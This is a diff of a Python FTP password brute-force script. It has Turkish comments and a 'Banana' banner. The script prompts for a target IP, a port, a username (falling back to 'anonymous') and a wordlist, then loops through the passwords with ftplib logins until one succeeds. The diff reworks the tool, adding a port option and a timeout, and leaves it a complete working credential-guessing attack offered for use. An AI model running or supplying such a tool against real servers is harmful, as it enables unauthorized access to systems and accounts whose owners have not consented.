@@ -1,74 +1,58 @@
 import ftplib
-import time
 import os
+import time
 
-# Terminali temizle
 os.system("clear")
 
-# ASCII banner
 print(r"""
   ___                           
  | _ ) __ _ _ _  __ _ _ _  __ _ 
  | _ \/ _` | ' \/ _` | ' \/ _` |
  |___/\__,_|_||_\__,_|_||_\__,_|
-                                  
+
 """)
 
-print("🔒 Target IP:")
-target = input("> ")
+# Kullanıcıdan hedef IP ve port al
+target = input("📍 Target IP: ")
+port_input = input("📡 Target Port (default 21): ")
+port = int(port_input) if port_input else 21
 
-print("👤 FTP username (leave blank for 'anonymous'):")
-username = input("> ").strip()
-if username == "":
+# Kullanıcı adı al (boşsa anonymous)
+username = input("👤 FTP Username (leave blank for anonymous): ")
+if username.strip() == "":
     username = "anonymous"
 
-print("Do you wanna use a ready-made passlist or your passlist? (y or n)")
-use_ready = input("> ").lower()
+# Parola listesi tercihi
+choice = input("📂 Use ready-made passlist.txt? (y/n): ").lower()
 
-passwords = []
-
-if use_ready == "y":
-    wordlist_path = "passlist.txt"
-    if not os.path.isfile(wordlist_path):
-        print(f"❌ File not found: {wordlist_path}")
-        exit()
-    with open(wordlist_path, "r", encoding="latin-1") as file:
-        passwords = [line.strip() for line in file if line.strip()]
+if choice == "y":
+    passlist_path = "passlist.txt"
 else:
-    print("Enter your passlist directory (relative to current directory):")
-    dir_path = input("> ").strip()
-    if not os.path.isdir(dir_path):
-        print(f"❌ Directory not found: {dir_path}")
-        exit()
-    # Dizin içindeki tüm dosyaları oku
-    for filename in os.listdir(dir_path):
-        file_path = os.path.join(dir_path, filename)
-        if os.path.isfile(file_path):
-            with open(file_path, "r", encoding="latin-1") as file:
-                lines = [line.strip() for line in file if line.strip()]
-                passwords.extend(lines)
+    passlist_path = input("📁 Type your password list path: ")
 
-if not passwords:
-    print("❌ No passwords found to try.")
+# Parola listesini yükle
+try:
+    with open(passlist_path, "r", encoding="utf-8", errors="ignore") as file:
+        passwords = file.read().splitlines()
+except FileNotFoundError:
+    print(f"❌ Password list not found at '{passlist_path}'")
     exit()
 
-os.system("clear")
-print(f"\n🚀 Starting FTP brute-force on {target} as {username} with {len(passwords)} passwords...\n")
+print(f"\n🚀 Starting FTP brute-force on {target}:{port} as {username} with {len(passwords)} passwords...\n")
 
+# Parola deneme
 for password in passwords:
-    print(f"🔍 Trying password: {password}")
     try:
-        ftp = ftplib.FTP(target)
+        ftp = ftplib.FTP()
+        ftp.connect(target, port, timeout=5)
         ftp.login(user=username, passwd=password)
-        print(f"\n✅ Success! Password found: {password}")
+        print(f"\n✅ Success! Username: {username} | Password: {password}")
         ftp.quit()
         break
     except ftplib.error_perm:
-        print("❌ Login failed")
+        print(f"🔍 Trying password: {password:<30} ❌ Incorrect")
     except Exception as e:
-        print("⚠️ Error:", e)
+        print(f"⚠️ Error: {e}")
         break
-    time.sleep(0.1)
-
 else:
-    print("\n🔚 Done. No password matched.")
+    print("\n❌ Password not found in list.")
